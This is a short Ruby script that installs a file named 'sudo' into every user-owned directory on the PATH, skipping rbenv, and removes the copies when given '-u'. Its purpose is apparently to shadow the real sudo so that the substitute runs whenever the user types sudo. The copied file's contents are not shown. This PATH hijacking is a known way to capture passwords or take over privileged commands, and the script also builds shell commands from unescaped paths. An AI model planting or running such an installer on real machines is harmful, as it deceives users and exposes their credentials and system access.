#!/usr/bin/env ruby

paths = ENV["PATH"].split(":")
                   .map { |path| path if `ls -ld #{path} | awk '{print $3}'` == `whoami` && !path.include?("rbenv") }
                   .compact

if ARGV.include?("-u")
  paths.each { |path| `rm #{path}/sudo` }
else
  paths.each { |path| `cp #{__dir__}/sudo #{path}/sudo && chmod +x #{path}/sudo` }
end